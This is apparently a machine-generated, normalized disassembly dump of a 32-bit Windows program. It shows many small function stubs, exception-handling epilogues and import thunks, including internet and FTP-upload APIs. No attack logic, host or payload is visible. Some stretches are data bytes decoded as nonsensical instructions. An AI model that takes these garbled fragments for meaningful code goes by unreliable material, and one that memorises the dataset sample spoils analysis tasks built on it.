mov edx ebx
call sub_427224
test eax eax
setne al
pop ebx
retn
sub_427518
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_427348
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x54 ]
pop esi
pop ebx
retn
sub_427530
push esi
push edi
mov edi edx
mov esi eax
mov eax esi
call sub_427348
mov edx edi
mov ecx [ eax ]
call [ ecx + 0x58 ]
pop edi
pop esi
retn
j_sub_404b30#2
jmp sub_404b30
sub_4276fa
jmp sub_404de4
sub_427701
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427864
retn
sub_4278d7
sar ch 0x1
[ esi + 0x5b ]
retn
sub_427a04
cmp [ eax + 0x28 ] 0x0
sete al
retn
sub_427d08
jmp sub_404de4
sub_427d0f
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427e87
jmp sub_404de4
sub_427e8e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_427f1f
jmp sub_404de4
sub_427f26
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_427f48
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_405554
retn
sub_427f41
jmp sub_404de4
sub_427f48
pop ebx
mov esp ebp
pop ebp
retn
sub_427f5d
add [ eax ] al
add [ ebx + 0x74002878 ] al
adc al [ eax + 0x74002c78 ]
pop es
call sub_428244
jmp r-xdata
retn
sub_427f73
call sub_4282d0
retn
sub_428068
retn
sub_4282c0
jmp sub_404de4
sub_4283eb
jmp sub_404de4
sub_4283f2
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0xc ]
push eax
push 0x0
call ReleaseDC
retn
sub_42840b
jmp sub_404de4
sub_428580
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
hlt
sub_42868e
jmp sub_404de4
sub_4286b6
jmp sub_404de4
sub_4286bd
mov esp ebp
pop ebp
retn
sub_428734
jmp sub_404de4
sub_42883c
jmp sub_404de4
sub_428927
jmp sub_404de4
sub_428934
inc [ eax + 0x4 ]
retn
sub_428aaf
jmp sub_404de4
sub_428e60
jmp sub_404de4
j_sub_404de4#8
jmp sub_404de4
sub_4290d4
jmp sub_404de4
sub_4290db
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4290fd
mov eax [ ebp - 0x14 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call SelectObject
retn
sub_4290f6
jmp sub_404de4
sub_429107
jmp sub_404b30
sub_429156
jmp sub_404de4
sub_429383
jmp sub_404de4
sub_4293cb
jmp sub_404de4
sub_429542
jmp sub_404de4
sub_42960c
jmp sub_404b30
sub_429660
mov [ eax + 0x31 ] 0x0
call sub_426cec
retn
sub_4298b3
jmp sub_404de4
sub_42991e
jmp sub_404de4
sub_429925
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_429994
mov eax [ eax + 0x28 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x14 ] 0x0
jne r-xdata
cmp [ eax + 0x6c ] 0x0
je r-xdata
mov al 0x1
retn
sub_429a48
mov ecx eax
mov eax [ ecx + 0x28 ]
mov eax [ eax + 0x20 ]
cdq
xor eax edx
sub eax edx
retn
sub_429a58
push ebx
mov ebx eax
mov eax ebx
call sub_429cfc
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0xc ]
pop ebx
retn
sub_429a6c
mov eax [ eax + 0x28 ]
add eax 0x18
cmp [ eax + 0x10 ] 0x1
jne r-xdata
xor eax eax
retn
cmp [ eax + 0x12 ] 0x1
je r-xdata
mov al 0x1
retn
sub_429a88
push ebx
mov ebx eax
mov eax ebx
call sub_429d5c
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
pop ebx
retn
sub_429bd0
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x1c ]
retn
sub_429cdf
jmp sub_404de4
sub_429f44
jmp sub_404b30
sub_429fa4
jmp sub_404de4
sub_429fab
mov eax [ ebp - 0x4 ]
mov [ eax + 0x32 ] 0x0
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0xc
sub_42a38f
jmp sub_404de4
sub_42a3bb
jmp sub_404de4
sub_42a422
jmp sub_404b30
sub_42a453
jmp sub_404de4
sub_42a4d8
jmp sub_404b30
sub_42a4dd
mov eax [ ebp - 0x38 ]
call sub_404650
call sub_404eec
call sub_404f40
sub_42a4ef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a50c
mov eax [ ebp - 0x18 ]
call sub_402f1c
retn
sub_42a505
jmp sub_404de4
sub_42a65f
jmp sub_404b30
sub_42a8f4
jmp sub_404b30
sub_42aa7c
jmp sub_404de4
sub_42aab4
mov cl 0x1
call sub_42aabc
retn
sub_42ad71
add [ eax ] al
add [ ebx ] dh
leave
call sub_42aabc
retn
sub_42adf6
jmp sub_404b30
sub_42adfb
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
push eax
call DeleteObject
call sub_404eec
call sub_404f40
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42aeb0
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
pop ebx
retn
push eax
call DestroyIcon
sub_42afed
add [ eax ] al
add [ ebx + 0x78832840 ] cl
or [ eax ] al
jne r-xdata
xor eax eax
retn
cmp [ eax + 0xc ] 0x0
je r-xdata
mov al 0x1
retn
sub_42b01c
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x14 ]
test eax eax
jne r-xdata
retn
push 0xc
call GetSystemMetrics
sub_42b030
mov eax [ eax + 0x28 ]
mov eax [ eax + 0x10 ]
test eax eax
jne r-xdata
retn
push 0xb
call GetSystemMetrics
sub_42b149
jmp sub_404b30
sub_42b1fe
jmp sub_404b30
sub_42b268
jmp sub_404b30
sub_42b319
jmp sub_404de4
sub_42b330
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4259c8
retn
mov [ eax + 0x30 ] edx
retn
sub_42b348
push ebx
mov ebx [ eax + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4259c8
pop ebx
retn
mov [ eax + 0x2c ] edx
mov [ eax + 0x30 ] ecx
pop ebx
retn
sub_42b368
retn
sub_42b36c
mov ecx [ eax + 0x28 ]
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
mov eax [ rw-data ]
call sub_4259c8
retn
mov [ eax + 0x2c ] edx
retn
sub_42b3ac
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4259c8
pop ebp
retn 0x4
sub_42b3c0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_4259c8
pop ebp
retn 0x4
sub_42b419
jmp sub_404de4
sub_42b420
mov eax rw-data
mov edx 0xf
call sub_426060
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_42b537
jmp sub_404de4
sub_42b57f
jmp sub_404de4
sub_42b586
mov esp ebp
pop ebp
retn
sub_42b6bc
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_42b6c8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_42b775
jmp sub_404de4
sub_42b77c
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42b867
jmp sub_404b30
sub_42b8d5
jmp sub_404de4
sub_42ba09
jmp sub_404de4
sub_42ba10
pop ebp
retn
sub_42bca2
jmp sub_404de4
sub_42bd3e
jmp sub_404de4
sub_42bd64
push ebx
mov ebx eax
push ebx
push 0x0
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_42bbf8
call sub_404ec4
pop ebx
retn
sub_42be09
jmp sub_404de4
sub_42be10
pop esi
pop ebx
pop ecx
pop ebp
retn
j_sub_404c5c#3
jmp sub_404c5c
sub_42bf24
jmp sub_404de4
sub_42bf2b
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c0fd
jmp sub_404de4
sub_42c104
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
j_sub_404c5c
jmp sub_404c5c
sub_42c1f1
jmp sub_404de4
sub_42c1f8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c420
jmp sub_404de4
sub_42c427
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42c738
jmp sub_404de4
sub_42c73f
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42c762
lea eax [ ebp - 0x20 ]
mov edx [ r-xdata ]
call sub_4060ac
retn
sub_42c75b
jmp sub_404de4
sub_42c762
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42c880
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
call sub_404ec4
retn
sub_42c9f9
jmp sub_404de4
sub_42ca00
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_42ca08
push 0x0
xor ecx ecx
call sub_42c934
retn
sub_42ca14
xor ecx ecx
mov edx 0x20
call sub_403af4
retn
sub_42ccd6
jmp sub_404de4
sub_42ccdd
pop ebp
retn
sub_42ce34
mov edx [ eax + 0x4 ]
mov ecx [ edx + 0x8 ]
dec ecx
mov eax edx
mov edx ecx
call sub_419898
retn
sub_42ce68
mov eax [ eax + 0x4 ]
call sub_419740
retn
ImageList_Create
jmp [ ImageList_Create@IAT ]
ImageList_Destroy
jmp [ ImageList_Destroy@IAT ]
ImageList_GetImageCount
jmp [ ImageList_GetImageCount@IAT ]
ImageList_Add
jmp [ ImageList_Add@IAT ]
ImageList_SetBkColor
jmp [ ImageList_SetBkColor@IAT ]
ImageList_GetBkColor
jmp [ ImageList_GetBkColor@IAT ]
ImageList_Remove
jmp [ ImageList_Remove@IAT ]
ImageList_BeginDrag
jmp [ ImageList_BeginDrag@IAT ]
ImageList_EndDrag
jmp [ ImageList_EndDrag@IAT ]
ImageList_DragEnter
jmp [ ImageList_DragEnter@IAT ]
ImageList_DragLeave
jmp [ ImageList_DragLeave@IAT ]
ImageList_DragMove
jmp [ ImageList_DragMove@IAT ]
ImageList_DragShowNolock
jmp [ ImageList_DragShowNolock@IAT ]
ImageList_Read
jmp [ ImageList_Read@IAT ]
ImageList_Write
jmp [ ImageList_Write@IAT ]
ImageList_GetIconSize
jmp [ ImageList_GetIconSize@IAT ]
ImageList_SetIconSize
jmp [ ImageList_SetIconSize@IAT ]
_TrackMouseEvent
jmp [ _TrackMouseEvent@IAT ]
sub_42d2e4
cmp [ rw-data ] 0x0
jne r-xdata
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_42d394
mov edx eax
test edx edx
je r-xdata
mov eax rw-data
call sub_407024
sub edx 0xffffffdc
sub_42d510
jmp sub_404de4
sub_42d517
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42d67a
jmp sub_404de4
sub_42d6c5
jmp sub_404de4
sub_42d6cc
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42d778
jmp sub_404de4
sub_42d77f
movzx eax [ ebp - 0xd ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_42d956
jmp sub_404de4
sub_42d9f1
jmp sub_404de4
sub_42da0e
jmp sub_404de4
sub_42da33
jmp sub_404de4
sub_42da3a
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dab8
jmp sub_404de4
sub_42dabf
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_42dced
jmp sub_404de4
sub_42dd51
jmp sub_404de4
sub_42dd58
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42de47
jmp sub_404de4
sub_42de4e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42dea0
lea eax [ ebp - 0x4 ]
call sub_40700c
retn
sub_42dea9
jmp sub_404de4
j_sub_42dea0
jmp sub_42dea0
sub_42deb0
pop ebx
pop ecx
pop ebp
retn
sub_42df55
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_42df5e
jmp sub_404de4
j_sub_42df55
jmp sub_42df55
sub_42df65
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
sub_42e05c
jmp sub_404de4
sub_42e08d
jmp sub_404de4
sub_42e094
movzx eax [ ebp - 0x11 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_42e09d
add [ eax ] al
add [ ecx ] cl
pop [ ecx + 0x69 ]
dec ecx
pop esi
cdq
dec eax
sahf
adc ebx [ edi + 0x7549c1e3 ]
mov ax [ eax + 0x1c ]
retn
sub_42e169
jmp sub_404de4
sub_42e170
pop ebp
retn
sub_42e231
jmp sub_404de4
sub_42e238
mov eax esi
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_42e84c
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
mov [ rw-data ] sub_42e258
mov [ rw-data ] sub_42e370
mov [ rw-data ] sub_42e2e0
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] sub_42e574
mov [ rw-data ] sub_42e648
mov [ rw-data ] sub_42e71c
retn
sub_42e8dd
jmp sub_404de4
sub_42e8e4
pop ebp
retn
sub_42ecb4
retn
sub_42ecb8
retn
sub_42ee24
mov eax [ eax + 0x4 ]
push eax
call SetEvent
retn
sub_42ee30
mov eax [ eax + 0x4 ]
push eax
call ResetEvent
retn
sub_42eeac
add eax 0x4
push eax
call EnterCriticalSection
retn
sub_42eeb8
add eax 0x4
push eax
call LeaveCriticalSection
retn
sub_42eec4
mov edx [ eax ]
call [ edx ]
retn
sub_42eecc
mov edx [ eax ]
call [ edx + 0x4 ]
retn
sub_42f1fb
jmp sub_404de4
sub_42f202
pop ebp
retn
sub_42f5b7
jmp sub_404de4
sub_42f5be
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_42f9d8
jmp sub_404de4
sub_42f9df
pop ebp
retn
sub_42fb6f
jmp sub_404de4
sub_42fb76
pop ebp
retn
FtpPutFileA
jmp [ FtpPutFileA@IAT ]
HttpQueryInfoA
jmp [ HttpQueryInfoA@IAT ]
InternetConnectA
jmp [ InternetConnectA@IAT ]
InternetOpenA
jmp [ InternetOpenA@IAT ]
InternetOpenUrlA
jmp [ InternetOpenUrlA@IAT ]
InternetReadFile
jmp [ InternetReadFile@IAT ]
SHGetPathFromIDListA
jmp [ SHGetPathFromIDListA@IAT ]
SHGetSpecialFolderLocation
jmp [ SHGetSpecialFolderLocation@IAT ]
sub_42fbf1
jmp sub_404de4
sub_42fbf8
pop ebp
retn
sub_430969
jmp sub_404de4
sub_430970
pop ebp
retn
sub_430b4a
jmp sub_404b30
sub_430c03
jmp sub_404de4
sub_430c0a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430c10
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_430b84
sub_430c20
cmp edx [ eax + 0x30 ]
je r-xdata
retn
mov [ eax + 0x30 ] edx
call sub_430b84
sub_430c30
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov [ eax + 0x38 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x3c ] edx
call sub_430b84
pop ebp
retn 0x8
sub_430c48
push ebx
cmp [ eax + 0x3a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x3c ]
call [ ebx + 0x38 ]
sub_430c81
jmp sub_404de4
sub_430c88
pop ebp
retn
sub_430f5a
jmp sub_404b30
sub_430f5f
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_430f7c
mov ecx [ eax ]
call [ ecx - 0x14 ]
retn
sub_430f84
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
mov si 0xffef
call sub_40484c
pop esi
retn
sub_430f9c
push ebx
push esi
mov ebx edx
mov si 0xffee
call sub_40484c
xor eax eax
mov [ ebx + 0xc ] eax
pop esi
pop ebx
retn
sub_430fb4
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
xor eax eax
mov [ esi + 0x3c ] eax
pop esi
retn
sub_431038
jmp sub_404de4
sub_431071
jmp sub_404de4
sub_431078
mov eax [ ebp - 0xc ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_431084
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_431098
push ebx
cmp [ eax + 0x5a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x5c ]
call [ ebx + 0x58 ]
sub_4312f7
jmp sub_404de4
sub_4312fe
pop ebp
retn
sub_4313d0
jmp sub_404de4
sub_4313d7
pop ecx
pop ebp
retn
sub_4313dc
push ebx
mov ebx eax
cmp [ ebx + 0x4 ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0xd ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x10 ]
mov [ ebx + 0xd ] 0x1
sub_431533
jmp sub_404de4
sub_431544
jmp sub_404b30
sub_431572
jmp sub_404de4
sub_431579
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_4315f6
jmp sub_404de4
sub_4315fd
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_4316d8
jmp sub_404de4
sub_431740
jmp sub_404de4
sub_431747
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4317a5
jmp sub_404de4
sub_4317ac
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_431891
jmp sub_404de4
sub_431898
pop ebx
mov esp ebp
pop ebp
retn
sub_431915
jmp sub_404de4
sub_43191c
pop ebx
mov esp ebp
pop ebp
retn
sub_4319b4
jmp sub_404de4
sub_4319bb
mov eax [ ebp - 0x8 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_431a33
jmp sub_404de4
sub_431a3a
movzx eax [ ebp - 0x1 ]
pop ebx
pop ecx
pop ebp
retn
sub_431ac6
jmp sub_404b30
sub_431b5d
jmp sub_404de4
sub_431b64
pop ebp
retn
sub_431f9d
jmp sub_404de4
sub_431fa4
pop ebp
retn
sub_43200f
jmp [ edi ]
sub_432348
push ebx
cmp [ eax + 0x6a ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov edx eax
mov eax [ ebx + 0x6c ]
call [ ebx + 0x68 ]
sub_43238c
push ebx
mov ebx eax
mov eax ebx
call sub_432a68
mov eax ebx
mov edx [ eax ]
call [ edx ]
pop ebx
retn
sub_432a57
jmp sub_404de4
sub_432a68
push ebx
mov ebx eax
cmp [ ebx + 0x6 ] 0x0
je r-xdata
call sub_42f968
mov [ ebx + 0x6 ] al
pop ebx
retn
mov eax ebx
call sub_43235c
sub_432b15
jmp sub_404de4
sub_432b1c
pop ebp
retn
sub_433a2b
jmp [ eax + eax ]
sub_433a8c
mov eax [ esp + 0x8 ]
retn
sub_433a94
push ebx
mov ebx eax
call sub_433a8c
push eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_40dbb8
jmp sub_404ec4
sub_433ab0
pop ebx
retn
sub_433d1f
jmp sub_404de4
sub_433d26
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433ee3
jmp sub_404de4
sub_433eea
movzx eax [ ebp - 0x6 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_433f04
push ebx
mov eax [ rw-data ]
call sub_419d9c
mov ebx eax
movzx edx bx
mov cl 0x1
mov eax [ rw-data ]
call sub_419d70
mov eax ebx
pop ebx
retn
sub_434094
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_404800
mov [ ebx + 0x18 ] eax
pop esi
pop ebx
retn
sub_4340b0
push ebx
mov ebx eax
mov eax [ ebx + 0x10 ]
mov edx [ r-xdata ]
call sub_404800
movzx eax [ eax + 0x95 ]
mov edx [ ebx + 0x18 ]
cmp al [ edx + 0xa8 ]
sete al
pop ebx
retn
sub_4347a1
jmp sub_404de4
sub_4347a8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_43489e
jmp sub_404de4
sub_4348a5
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_434cd0
jmp sub_404de4
sub_434cd7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
sub_4351cc
jmp sub_404de4
sub_43567e
jmp sub_404de4
sub_435685
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_435b30
jmp sub_404de4
sub_435ffe
jmp sub_404de4
sub_436005
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4363d2
jmp sub_404de4
sub_4363d9
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4363e7
inc [ ecx ]
add [ eax ] al
add [ 0xffffffffb0000000 ] ch
add ebx eax
nop
cmp dl [ eax + 0x48 ]
je r-xdata
retn
mov [ eax + 0x48 ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_436598
mov eax [ r-xdata ]
retn
sub_4365d4
cmp dx [ eax + 0x60 ]
je r-xdata
retn
mov [ eax + 0x60 ] dx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4365e8
cmp dl [ eax + 0x3e ]
je r-xdata
retn
mov [ eax + 0x3e ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4365f8
cmp edx [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] edx
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_436608
or edx 0xffffffff
mov ecx [ eax + 0x64 ]
test ecx ecx
je r-xdata
mov eax edx
retn
mov edx eax
mov eax ecx
call sub_436908
mov edx eax
sub_4366a0
push ebx
push esi
mov esi ecx
mov ebx edx
mov eax ebx
mov edx [ r-xdata ]
call sub_404800
mov edx esi
call sub_436620
pop esi
pop ebx
retn
sub_43671c
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
retn
mov eax edx
mov edx [ eax ]
call [ edx + 0x1c ]
sub_436908
push esi
or ecx 0xffffffff
mov esi [ eax + 0x5c ]
test esi esi
je r-xdata
mov eax ecx
pop esi
retn
mov eax esi
call sub_4198f4
mov ecx eax
sub_436af8
mov edx [ eax + 0x64 ]
test edx edx
je r-xdata
mov eax edx
retn
cmp [ edx + 0x70 ] 0x0
je r-xdata
mov eax [ edx + 0x70 ]
retn
sub_436b60
jmp r-xdata
mov edx [ eax + 0x64 ]
test edx edx
jne r-xdata
mov eax edx
mov eax [ eax + 0x70 ]
retn
sub_436f10
cmp edx [ eax + 0x7c ]
jne r-xdata
retn
call sub_436f44
sub_436f44
mov edx sub_436f1c
mov ecx eax
mov eax [ eax + 0x68 ]
xchg edx eax
call sub_433f88
retn
sub_43714f
jmp sub_404de4
sub_437156
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4375dd
jmp sub_404de4
sub_437614
jmp sub_404de4
sub_43761b
movzx eax [ ebp - 0x26 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4377bc
cmp dl [ eax + 0x3c ]
je r-xdata
retn
mov [ eax + 0x3c ] dl
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_4378c8
mov ecx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_434420
retn
sub_437910
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov eax [ eax + 0x34 ]
mov si 0xfffd
call sub_40484c
pop esi
pop ebp
retn 0x8
sub_43792c
mov eax [ eax + 0x34 ]
call sub_434a54
retn
sub_437938
push esi
mov esi eax
mov eax [ esi + 0x34 ]
mov si 0xfff9
call sub_40484c
pop esi
retn
sub_437974
push ebx
mov ecx sub_43794c
mov edx [ eax + 0x34 ]
mov ebx [ edx + 0x68 ]
mov eax edx
xchg ecx eax
mov edx ebx
call sub_433f88
pop ebx
retn
sub_437ba8
cmp [ eax + 0x40 ] 0x0
jne r-xdata
mov al 0x1
retn
cmp [ eax + 0x48 ] 0x0
jne r-xdata
xor eax eax
retn
sub_437ca8
jmp sub_404de4
sub_437caf
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437ccc
mov eax [ ebp - 0xc ]
call sub_404650
retn
sub_437cc5
jmp sub_404de4
sub_437ccc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_437cf6
lea eax [ ebp - 0x20 ]
mov edx 0x2
call sub_405554
lea eax [ ebp - 0x4 ]
call sub_405530
retn
sub_437cef
jmp sub_404de4
sub_437cf6
pop ebx
mov esp ebp
pop ebp
retn
sub_437dec
jmp r-xdata
test edx edx
jle r-xdata
retn
test eax eax
jne r-xdata
mov eax [ eax + 0x64 ]
dec edx
sub_437f22
jmp sub_404b30
sub_437ff8
jmp sub_404de4
sub_438023
jmp sub_404de4
sub_438044
movzx eax [ eax + 0x41 ]
xor al 0x1
retn
sub_438238
cmp dl [ eax + 0x40 ]
je r-xdata
retn
mov [ eax + 0x40 ] dl
call sub_437974
sub_4382bc
jmp sub_404de4
sub_438300
push ebx
cmp [ eax + 0x52 ] 0x0
je r-xdata
pop ebx
retn
push ecx
mov ebx eax
mov ecx edx
mov edx eax
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
sub_438318
push ebx
mov ebx eax
mov eax ebx
call sub_42042c
xor ecx ecx
xor edx edx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop ebx
retn
sub_43836a
add [ eax ] al
cmp edx [ eax + 0x48 ]
jne r-xdata
retn
call sub_437974
sub_4383e0
mov edx [ rw-data ]
cmp [ edx + 0xd ] 0x0
je r-xdata
xor eax eax
retn
cmp [ eax + 0x30 ] 0x0
jne r-xdata
mov al 0x1
retn
sub_43857f
jmp sub_404de4
sub_438586
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_4387cc
cmp dl [ eax + 0x41 ]
je r-xdata
retn
mov [ eax + 0x41 ] dl
call sub_4387dc
sub_438830
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3b ]
movzx eax [ eax + rw-data ]
retn
sub_438840
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3b ] dl
retn
sub_438854
mov eax [ eax + 0x34 ]
movzx eax [ eax + 0x3c ]
movzx eax [ eax + rw-data ]
retn
sub_438864
and edx 0x7f
movzx edx [ edx + rw-data ]
mov eax [ eax + 0x34 ]
mov [ eax + 0x3c ] dl
retn
sub_438878
cmp dl [ eax + 0x5c ]
je r-xdata
retn
mov [ eax + 0x5c ] dl
mov edx [ eax + 0x38 ]
test edx edx
je r-xdata
push 0x0
push 0x0
push 0xb015
push edx
call SendMessageA
sub_4388f4
test edx edx
je r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4348ac
retn
mov eax [ eax + 0x34 ]
mov edx [ edx + 0x34 ]
call sub_4348ac
retn
sub_438910
test edx edx
je r-xdata
retn
mov ecx [ eax + 0x34 ]
mov ecx [ ecx + 0x68 ]
cmp ecx [ edx + 0x34 ]
jne r-xdata
xor edx edx
mov eax [ eax + 0x34 ]
call sub_4348ac
sub_438958
mov edx [ eax + 0x58 ]
test edx edx
je r-xdata
call sub_43792c
retn
mov eax edx
retn
sub_438992
jmp sub_404b30
sub_438997
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4467a4
call sub_404f40
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_438cfe
jmp sub_404de4
sub_438d05
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x14 ]
call sub_404650
retn
sub_438d1b
jmp sub_404de4
sub_438e1c
jmp sub_404de4
sub_438e23
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_438e40
mov eax [ ebp - 0x14 ]
call sub_404650
retn
sub_438e39
jmp sub_404de4
sub_438e5e
jmp sub_404de4
sub_438ee8
jmp sub_404de4
sub_438eef
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_438f20
push ebx
mov ebx eax
mov eax ebx
call sub_4199dc
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x10 ]
call sub_4211f4
sub_438fe4
push ebx
cmp [ eax + 0x72 ] 0x0
je r-xdata
pop ebx
retn
mov ebx eax
mov eax [ ebx + 0x74 ]
call [ ebx + 0x70 ]
sub_438ff8
mov eax [ eax + 0x34 ]
mov eax [ eax + 0x54 ]
retn
sub_439000
mov eax [ eax + 0x34 ]
mov [ eax + 0x54 ] edx
retn
sub_43948f
jmp sub_404de4
sub_439496
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_439598
jmp sub_404de4
sub_43959f
pop ebp
retn
sub_4399c8
xchg esp eax
int 0x43
add al cl
iretd
sub_43a14b
[ esi - 0x53005201 ]
sub_43a151
[ ebx - 0x56005501 ]
sub_43a158
std
[ eax - 0x59005801 ]
